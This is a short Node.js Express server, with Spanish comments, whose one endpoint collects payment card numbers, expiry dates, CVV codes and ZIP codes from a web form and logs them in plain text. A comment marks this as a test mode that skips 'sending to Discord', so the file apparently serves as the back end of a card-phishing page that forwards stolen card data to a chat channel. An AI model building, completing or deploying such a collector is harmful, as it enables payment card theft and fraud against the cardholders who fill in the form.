const express = require('express');
const cors = require('cors');
const fetch = require('node-fetch');
const app = express();

// Middleware
app.use(cors());
app.use(express.json());

// Puerto de Railway o local
const PORT = process.env.PORT || 3000;

// Endpoint para recibir los datos del formulario
app.post('/api/submit-form', async (req, res) => {
    try {
        const { card, mm, aa, cvv, zip } = req.body;

        // TEST MODE: Solo loggear los datos sin enviar a Discord
        console.log('TEST MODE - Datos recibidos:', { card, mm, aa, cvv, zip });
        
        // Simular respuesta exitosa
        res.json({ success: true, test: true });

    } catch (error) {
        console.error('Error:', error);
        res.status(500).json({ error: 'Internal server error' });
    }
});

// Health check endpoint
app.get('/health', (req, res) => {
    res.json({ status: 'ok' });
});

app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
